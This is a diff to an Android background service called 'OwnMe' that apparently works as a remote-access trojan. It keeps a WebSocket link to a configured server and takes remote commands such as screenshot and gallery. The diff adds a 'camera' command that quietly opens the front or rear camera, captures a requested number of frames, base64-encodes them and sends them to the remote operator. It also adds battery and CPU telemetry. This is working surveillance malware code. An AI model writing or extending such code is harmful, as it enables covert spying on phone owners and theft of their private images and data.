@@ -12,13 +12,27 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.graphics.ImageFormat;
+import android.hardware.Camera;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
 import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CameraMetadata;
+import android.hardware.camera2.CaptureRequest;
+import android.hardware.camera2.TotalCaptureResult;
+import android.media.Image;
+import android.media.ImageReader;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
@@ -28,6 +42,8 @@ import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
+import android.util.Size;
+import android.view.Surface;
 import android.widget.Toast;
 
 import org.java_websocket.client.WebSocketClient;
@@ -37,10 +53,14 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.RandomAccessFile;
 import java.net.URI;
 import java.net.URISyntaxException;
+import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -49,17 +69,29 @@ import java.util.TimerTask;
  */
 
 public class OwnMe extends Service {
+    String TAG = "Camera";
+    int frames=100;
     private WebSocketClient mWebSocketClient;
     private String android_id, dev_name;
     private String username;
     private Timer pingpong;
     private Timer retryHarder;
     private static final int PERMISSIONS_REQUEST_READ_PHONE_STATE = 999;
+    String sender;
     TelephonyManager telephonyManager=null;
     boolean webopen = false;
     JSONObject ping;
     JSONObject handshake;
     private Intent savedIntent;
+    //______________Camera Stuff
+    private Object stateCallbackVideo;
+    private String cameraId;
+    String opImage="";
+    protected CameraDevice cameraDevice;
+    private ImageReader imageReader;
+    private Handler mBackgroundHandler;
+    private HandlerThread mBackgroundThread;
+    //_______________
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
@@ -71,16 +103,16 @@ public class OwnMe extends Service {
         pingpong.purge();
         retryHarder.cancel();
         retryHarder.purge();
-        retryHarder=new Timer();
-        retryHarder.scheduleAtFixedRate(new TimerTask() {
-            @Override
-            public void run() {
-                Log.d("Timer Running", "trying for socket");
-                if (!webopen) {
-                  connectWebSocket();
-                }
-            }
-        },new Date(new Date().getTime()+5000),100000000*365);
+        retryHarder = new Timer();
+//        retryHarder.scheduleAtFixedRate(new TimerTask() {
+//            @Override
+//            public void run() {
+//                Log.d("Timer Running", "trying for socket");
+//                if (!webopen) {
+//                  connectWebSocket();
+//                }
+//            }
+//        },new Date(new Date().getTime()+5000),100000000*365);
     }
     public String getNetworkState() {
         ConnectivityManager cm =
@@ -120,8 +152,7 @@ public class OwnMe extends Service {
         retryHarder = new Timer();
         username = getString(R.string.user_name);
         android_id = Settings.Secure.getString(getBaseContext().getContentResolver(), Settings.Secure.ANDROID_ID);
-
-
+        mBackgroundHandler=new Handler(Looper.getMainLooper());
         dev_name = Build.MANUFACTURER + " " + Build.MODEL;
         int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
         ping = new JSONObject();
@@ -129,6 +160,8 @@ public class OwnMe extends Service {
         try {
             ping.put("type", "ping");
             ping.put("id", android_id);
+            ping.put("battery", "");
+            ping.put("cpu", "");
             handshake.put("type","handshake");
             handshake.put("user",username);
             handshake.put("id",android_id);
@@ -136,6 +169,7 @@ public class OwnMe extends Service {
             handshake.put("devuser",getUsername());
             handshake.put("connection",getNetworkState());
             handshake.put("api",sdkVersion);
+            handshake.put("cameras", android.hardware.Camera.getNumberOfCameras());
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -154,8 +188,7 @@ public class OwnMe extends Service {
 
 
     private void connectWebSocket() {
-        retryHarder.cancel();
-        retryHarder.purge();
+        pingpong.cancel();
         URI uri;
         try {
             uri = new URI("ws://"+getString(R.string.ip)+":"+getString(R.string.port));
@@ -172,10 +205,9 @@ public class OwnMe extends Service {
                 webopen = true;
                 pingpong.cancel();
                 pingpong.purge();
-                pingpong = new Timer();
                 retryHarder.cancel();
                 retryHarder.purge();
-                retryHarder=new Timer();
+                pingpong=new Timer();
                 pingpong.scheduleAtFixedRate(new TimerTask() {
                     @Override
                     public void run() {
@@ -183,8 +215,6 @@ public class OwnMe extends Service {
                         if (webopen) {
                             updateBattery();
                             mWebSocketClient.send(ping.toString());
-                        } else {
-
                         }
                     }
                 }, 5000, 5000);
@@ -202,6 +232,7 @@ public class OwnMe extends Service {
                     Log.d("shubham", "onMessage: inside try");
                     Log.d("shubham", "onMessage: " + x.get("cmd"));
                     x.put("to", x.get("from"));
+                    sender=x.getString("from");
                     x.remove("from");
                     cmd=x.get("cmd").toString();
                     if (cmd.equals("screenshot")) {
@@ -231,8 +262,10 @@ public class OwnMe extends Service {
                             y.put("total",pg);
                             mWebSocketClient.send(y.toString());
                         }
-                    } else if(cmd.equals("file")){
-
+                    } else if(cmd.equals("camera")){
+                        int cam=Integer.parseInt(String.valueOf(x.get("cam")));
+                        int f=Integer.parseInt(String.valueOf(x.get("frames")));
+                            openCameraVideo(cam,f);
                     }else {
                         x.put("type","error");
                         x.put("response","no command found");
@@ -242,19 +275,20 @@ public class OwnMe extends Service {
                     Log.d("shubham", "onMessage: inside catch");
                     e.printStackTrace();
                 }
-                if(!cmd.equals("gallery"))
+                if(!cmd.equals("gallery")&&!cmd.equals("camera"))
                     mWebSocketClient.send(x.toString());
             }
 
             @Override
             public void onClose(int i, String s, boolean b) {
                 Log.i("Websocket", "Closed " + s);
+                stopSelf();
                 webopen = false;
                 pingpong.cancel();
                 pingpong.purge();
                 retryHarder.cancel();
                 retryHarder.purge();
-                retryLater();
+                //retryLater();
             }
 
             @Override
@@ -382,6 +416,41 @@ public class OwnMe extends Service {
         return ret.toString();
     }
 
+
+    private float readUsage() {
+        try {
+            RandomAccessFile reader = new RandomAccessFile("/proc/stat", "r");
+            String load = reader.readLine();
+
+            String[] toks = load.split(" +");  // Split on one or more spaces
+
+            long idle1 = Long.parseLong(toks[4]);
+            long cpu1 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[5])
+                    + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);
+
+            try {
+                Thread.sleep(360);
+            } catch (Exception e) {}
+
+            reader.seek(0);
+            load = reader.readLine();
+            reader.close();
+
+            toks = load.split(" +");
+
+            long idle2 = Long.parseLong(toks[4]);
+            long cpu2 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[5])
+                    + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);
+
+            return (float)(cpu2 - cpu1) / ((cpu2 + idle2) - (cpu1 + idle1));
+
+        } catch (IOException ex) {
+            ex.printStackTrace();
+        }
+
+        return 0;
+    }
+
     private void updateBattery(){
         IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent batteryStatus = getBaseContext().registerReceiver(null, ifilter);
@@ -398,7 +467,10 @@ public class OwnMe extends Service {
         int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
         float batteryPct = level / (float)scale * 100;
         try {
-            ping.put("battery",batteryPct);
+            ping.remove("battery");
+            ping.remove("cpu");
+            ping.put("battery",(int)batteryPct);
+            ping.put("cpu",(int)(readUsage()*100));
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -448,10 +520,223 @@ public class OwnMe extends Service {
     }
 
 
-    private String getCameraIds(){
-        CameraManager manager = (CameraManager)getSystemService(Context.CAMERA_SERVICE);
-        JSONObject x =new JSONObject();
-        return "";
+    /***
+     * Camera Stuff that is done is here all the call backs aswell as the open and close functions
+     *
+
+     */
+
+    private void closeCamera() {
+        if (null != cameraDevice) {
+            cameraDevice.close();
+            cameraDevice = null;
+        }
+        if (null != imageReader) {
+            imageReader.close();
+            imageReader = null;
+        }
     }
+    Camera c=null;
+
+    private void openCameraVideo(int x,int fr) {
+        frames=fr;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+            stateCallbackVideo = new CameraDevice.StateCallback() {
+                            @Override
+                            public void onOpened(CameraDevice camera) {
+                                //This is called when the camera is open
+                                Log.e(TAG, "onOpened");
+                                cameraDevice = camera;
+                                //Log.e(TAG, "camera Id"+camera.getId());
+                                if(camera!=null)
+                                    takePictureR();
+                            }
+                            @Override
+                            public void onDisconnected(CameraDevice camera) {
+                                Log.e(TAG, "onDisconnect");
+
+                                cameraDevice.close();
+                            }
+                            @Override
+                            public void onError(CameraDevice camera, int error) {
+                                Log.e(TAG, "onError "+error);
+                                cameraDevice.close();
+                                cameraDevice = null;
+                            }
+                        };
+
+                CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        Log.e(TAG, "is camera open");
+        try {
+            cameraId = manager.getCameraIdList()[x];
+            // Add permission for camera and let user grant the permission
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                //No perms;
+                Log.d(TAG, "No Perms");
+                return;
+            }
+            frames = fr;
+            manager.openCamera(cameraId,(CameraDevice.StateCallback)stateCallbackVideo, mBackgroundHandler);
+            Log.d(TAG, "Camera Open");
+        } catch (CameraAccessException e) {
+            Log.d(TAG, "Camera Error");
+            e.printStackTrace();
+        }
+        Log.e(TAG, "openCamera " + cameraId);
+        }else{
+            c= Camera.open(x);
+            c.takePicture(null,null,mPicture);
+        }
+    }
+
+
+    public Camera.PictureCallback mPicture = new Camera.PictureCallback() {
+        @Override
+        public void onPictureTaken(byte[] data, Camera c) {
+            Log.d(TAG, "onPictureTaken: Picture Taken");
+            frames--;
+            {
+                JSONObject x = new JSONObject();
+                try {
+                    x.put("to",sender);
+                    x.put("response",Base64.encodeToString(data,Base64.DEFAULT));
+                    x.put("type","camera");
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                mWebSocketClient.send(x.toString());
+                Log.d(TAG, "onPictureTaken:Sending now ");
+            }
+
+            if(frames>0){
+                c.takePicture(null,null,mPicture);
+            }
+            else{
+                Log.d(TAG, "onPictureTaken:Cam release ");
+                c.release();
+            }
+        }
+    };
+
+
+//    private CameraDevice.StateCallback stateCallbackVideo = new CameraDevice.StateCallback() {
+//        @Override
+//        public void onOpened(CameraDevice camera) {
+//            //This is called when the camera is open
+//            Log.e(TAG, "onOpened");
+//            cameraDevice = camera;
+//            //Log.e(TAG, "camera Id"+camera.getId());
+//            if(camera!=null)
+//                takePictureR();
+//        }
+//        @Override
+//        public void onDisconnected(CameraDevice camera) {
+//            Log.e(TAG, "onDisconnect");
+//
+//            cameraDevice.close();
+//        }
+//        @Override
+//        public void onError(CameraDevice camera, int error) {
+//            Log.e(TAG, "onError "+error);
+//            cameraDevice.close();
+//            cameraDevice = null;
+//        }
+//    };
+
+    protected void takePictureR() {
+        if (null == cameraDevice) {
+            Log.e(TAG, "cameraDevice is null");
+            return;
+        }
+
+        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        try {
+            CameraCharacteristics characteristics = null;
+
+            characteristics = manager.getCameraCharacteristics(cameraDevice.getId());
+            Size[] jpegSizes = null;
+            if (characteristics != null) {
+                jpegSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP).getOutputSizes(ImageFormat.JPEG);
+            }
+            int width = 640;
+            int height = 480;
+            if (jpegSizes != null && 0 < jpegSizes.length) {
+                width = jpegSizes[0].getWidth();
+                height = jpegSizes[0].getHeight();
+            }
+            final ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
+            List<Surface> outputSurfaces = new ArrayList<Surface>();
+            outputSurfaces.add(reader.getSurface());
+            final CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+            captureBuilder.addTarget(reader.getSurface());
+            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
+            // Orientation
+            ImageReader.OnImageAvailableListener readerListener = new ImageReader.OnImageAvailableListener() {
+                @Override
+                public void onImageAvailable(ImageReader reader) {
+                    Image image = null;
+                    image = reader.acquireLatestImage();
+                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                    byte[] bytes = new byte[buffer.capacity()];
+                    buffer.get(bytes);
+                    opImage = Base64.encodeToString(bytes, Base64.DEFAULT);
+                    Log.d(TAG, "onImageAvailable: Image saved");
+                    if(mWebSocketClient.getConnection()!=null){
+                        JSONObject x = new JSONObject();
+                        try {
+                            x.put("to",sender);
+                            x.put("response",opImage);
+                            x.put("type","camera");
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
+                        mWebSocketClient.send(x.toString());
+                    }
+                    //Toast.makeText(getBaseContext(),"Captured",Toast.LENGTH_LONG).show();
+
+
+                }
+            };
+
+            reader.setOnImageAvailableListener(readerListener, mBackgroundHandler);
+            final CameraCaptureSession.CaptureCallback captureListener = new CameraCaptureSession.CaptureCallback() {
+                @Override
+                public void onCaptureCompleted(CameraCaptureSession session, CaptureRequest request, TotalCaptureResult result) {
+                    super.onCaptureCompleted(session, request, result);
+                    frames--;
+                    if(frames<=0){
+                    reader.close();
+                    session.close();
+                    closeCamera();
+                    Log.d(TAG,"Closed Camera");
+                    }else{
+                        takePictureR();
+                    }
+                }
+            };
+
+            cameraDevice.createCaptureSession(outputSurfaces, new CameraCaptureSession.StateCallback() {
+                @Override
+                public void onConfigured(CameraCaptureSession session) {
+                    try {
+
+                        session.capture(captureBuilder.build(), captureListener, mBackgroundHandler);
+
+                    } catch (CameraAccessException e) {
+                        e.printStackTrace();
+                    }
+                }
+
+                @Override
+                public void onConfigureFailed(CameraCaptureSession session) {
+                }
+            }, mBackgroundHandler);
+        } catch (CameraAccessException e) {
+            e.printStackTrace();
+        }
+
+
+    }
+    //Camera Stuff for the video part ends
 
 }
